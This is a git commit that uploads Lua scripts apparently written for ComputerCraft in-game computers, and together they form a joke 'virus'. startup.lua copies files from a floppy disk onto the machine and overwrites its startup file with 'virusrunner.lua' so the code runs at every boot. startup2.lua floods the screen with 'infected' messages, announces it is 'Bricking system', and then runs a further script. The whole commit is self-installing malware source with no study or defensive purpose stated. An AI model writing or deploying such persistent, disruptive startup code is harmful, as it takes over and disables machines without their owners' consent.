9295c740b1cbe9bb96bea0a5945e033bca8ad0e6
hapatapa <68708992+hapatapa@users.noreply.github.com>
2025-08-22 13:53:01 -0400

    Add files via upload

---
+++ startup.lua
@@ -0,0 +1,4 @@
+shell.run("copy disk/startup2.lua startup2.lua")
+shell.run("copy disk/startup3 startup3")
+shell.run("copy disk/virusrunner.lua startup")
+shell.run("startup2.lua")
---
+++ startup2.lua
@@ -0,0 +1,7 @@
+print("Your floppy was infected buddy")
+for count = 1, 10000 do
+    print("Your floppy was real infected buddy")
+end
+print("Bricking system cuz funny")
+sleep(1)
+shell.run("startup3")
